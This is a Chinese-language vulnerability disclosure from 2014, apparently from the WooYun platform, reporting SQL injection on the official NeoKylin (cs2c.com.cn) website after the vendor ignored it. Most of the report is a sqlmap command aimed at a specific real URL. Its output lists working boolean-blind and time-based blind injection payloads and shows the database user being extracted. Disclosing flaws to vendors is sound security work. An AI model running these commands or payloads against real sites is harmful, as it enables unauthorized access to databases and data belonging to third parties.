wybug_status: 未联系到厂商或者厂商积极忽略
wybug_detail:
漏洞详情 披露状态：   									2014-08-26：	积极联系厂商并且等待厂商认领中，细节不对外公开									2014-10-10：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： 中标麒麟官网sql注入 详细说明：  
root@kali:~# sqlmap -u "http://www.cs2c.com.cn/index.php?id=117" --current-user --level 5 --threads 10         _ ___ ___| |_____ ___ ___  {1.0-dev-nongit-20140825}|_ -| . | |     | .'| . ||___|_  |_|_|_|_|__,|  _|      |_|           |_|   http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 00:57:25[00:57:25] [INFO] resuming back-end DBMS 'mysql' [00:57:25] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: id    Type: boolean-based blind    Title: MySQL boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (RLIKE)    Payload: id=117 RLIKE (SELECT (CASE WHEN (7287=7287) THEN 117 ELSE 0x28 END))    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: id=117 AND SLEEP(5)---[00:57:25] [INFO] the back-end DBMS is MySQLweb application technology: Nginx, PHP 5.2.17back-end DBMS: MySQL 5.0.11[00:57:25] [INFO] fetching current user[00:57:25] [INFO] retrieving the length of query output[00:57:25] [INFO] retrieved: [00:57:25] [WARNING] reflective value(s) found and filtering out15[00:57:34] [INFO] retrieved: csc_shmsg_com@%             current user:    'csc_shmsg_com@%'[00:57:34] [INFO] fetched data logged to text files under '/root/.sqlmap/output/www.cs2c.com.cn'
如上   漏洞证明：
